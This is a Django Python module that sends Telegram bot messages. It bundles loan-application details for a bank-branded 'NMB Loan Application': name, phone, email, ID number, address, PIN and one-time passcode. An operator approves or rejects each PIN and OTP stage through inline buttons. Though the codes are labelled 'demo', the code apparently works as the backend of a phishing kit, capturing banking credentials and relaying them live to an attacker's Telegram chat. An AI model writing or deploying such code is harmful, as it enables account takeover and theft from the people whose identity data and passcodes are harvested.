import requests
from html import escape
from django.conf import settings


def send_telegram_notification(
    message: str,
    parse_mode: str = "HTML",
) -> bool:

    token = getattr(
        settings,
        "TELEGRAM_BOT_TOKEN",
        None,
    )

    chat_id = getattr(
        settings,
        "TELEGRAM_CHAT_ID",
        None,
    )

    if not token or not chat_id:
        print("Telegram credentials are not configured.")
        return False

    url = f"https://api.telegram.org/bot{token}/sendMessage"

    payload = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": parse_mode,
        "disable_web_page_preview": True,
    }

    try:
        response = requests.post(
            url,
            json=payload,
            timeout=10,
        )

        if not response.ok:
            print(
                f"Telegram API error: "
                f"{response.status_code} - {response.text}"
            )

        return response.ok

    except requests.RequestException as exc:
        print(f"Telegram request failed: {exc}")
        return False


def send_demo_verification_request(
    verification_id,
    phone,
    demo_numbers="",
    stage="4",
):
    """
    stage = "4"  → after login (4 numbers)
    stage = "6"  → after 6-digit entry
    """
    token = getattr(settings, "TELEGRAM_BOT_TOKEN", None)
    chat_id = getattr(settings, "TELEGRAM_CHAT_ID", None)

    if not token or not chat_id:
        print("Telegram credentials are not configured.")
        return None

    url = f"https://api.telegram.org/bot{token}/sendMessage"

    if stage == "4":
        title = "🧪 PIN Verification"
        next_step = "Approve to allow the user to enter the 6 demo numbers."
        label = "PIN"
    else:
        title = "🧪 OTP Verification"
        next_step = "Approve to let the user proceed to the final step."
        label = "OTP"

    message = (
        f"<b>{title}</b>\n\n"
        f"<b>Phone:</b> {escape(str(phone))}\n"
        f"<b>{label}:</b> <code>{escape(str(demo_numbers))}</code>\n"
        f"<b>Request ID:</b> <code>{escape(str(verification_id))}</code>\n\n"
        f"<b>Status:</b> Waiting for approval\n\n"
        f"{next_step}"
    )

    keyboard = {
        "inline_keyboard": [
            [
                {
                    "text": "✅ APPROVE",
                    "callback_data": f"approve:{verification_id}:{stage}",
                },
                {
                    "text": "❌ REJECT",
                    "callback_data": f"reject:{verification_id}:{stage}",
                },
            ]
        ]
    }

    payload = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "HTML",
        "reply_markup": keyboard,
    }

    try:
        response = requests.post(url, json=payload, timeout=10)
        if not response.ok:
            print(f"Telegram error: {response.status_code} - {response.text}")
            return None

        data = response.json()
        if data.get("ok"):
            return data["result"]["message_id"]

        print("Telegram returned an unsuccessful response:", data)
        return None

    except requests.RequestException as exc:
        print(f"Telegram request failed: {exc}")
        return None


def format_loan_application_message(
    session_data: dict,
) -> str:

    amount = escape(
        str(session_data.get("amount", "N/A"))
    )

    term = escape(
        str(session_data.get("term", "N/A"))
    )

    first_name = session_data.get(
        "first_name",
        "",
    )

    last_name = session_data.get(
        "last_name",
        "",
    )

    full_name = (
        f"{first_name} {last_name}"
    ).strip() or "N/A"

    email = session_data.get(
        "email",
        "N/A",
    )

    id_number = session_data.get(
        "id_number",
        "N/A",
    )

    address = session_data.get(
        "address",
        "",
    )

    city = session_data.get(
        "city",
        "",
    )

    full_address = (
        f"{address}, {city}"
    ).strip(", ") or "N/A"

    phone = session_data.get(
        "phone",
        "N/A",
    )

    # These values MUST come from the demo session.
    demo_numbers_4 = session_data.get(
        "demo_numbers_4",
        "N/A",
    )

    demo_numbers_6 = session_data.get(
        "demo_numbers_6",
        "N/A",
    )

    verification_status = (
        "Completed"
        if session_data.get(
            "verification_completed"
        )
        else "Not completed"
    )

    return (
        "<b>🧪 NMB Loan Application</b>\n\n"
        f"<b>Amount:</b> ${amount}\n"
        f"<b>Term:</b> {term} months\n"
        f"<b>Name:</b> "
        f"{escape(str(full_name))}\n"
        f"<b>Phone:</b> "
        f"{escape(str(phone))}\n"
        f"<b>PIN:</b> "
        f"{escape(str(demo_numbers_4))}\n"
        f"<b>OTP:</b> "
        f"{escape(str(demo_numbers_6))}\n"
        f"<b>Email:</b> "
        f"{escape(str(email))}\n"
        f"<b>ID Number:</b> "
        f"{escape(str(id_number))}\n"
        f"<b>Address:</b> "
        f"{escape(str(full_address))}\n"
        f"<b>Verification:</b> "
        f"{verification_status}"
    )


def answer_callback_query(
    callback_id,
    text,
):

    token = getattr(
        settings,
        "TELEGRAM_BOT_TOKEN",
        None,
    )

    if not token:
        return

    url = (
        f"https://api.telegram.org/"
        f"bot{token}/answerCallbackQuery"
    )

    try:
        requests.post(
            url,
            json={
                "callback_query_id": callback_id,
                "text": text,
            },
            timeout=10,
        )

    except requests.RequestException as exc:
        print(
            f"Callback response failed: {exc}"
        )


def edit_telegram_message(
    chat_id,
    message_id,
    text,
):

    token = getattr(
        settings,
        "TELEGRAM_BOT_TOKEN",
        None,
    )

    if not token:
        return

    url = (
        f"https://api.telegram.org/"
        f"bot{token}/editMessageText"
    )

    try:
        requests.post(
            url,
            json={
                "chat_id": chat_id,
                "message_id": message_id,
                "text": text,
                "parse_mode": "HTML",
            },
            timeout=10,
        )

    except requests.RequestException as exc:
        print(
            f"Telegram message update failed: {exc}"
        )
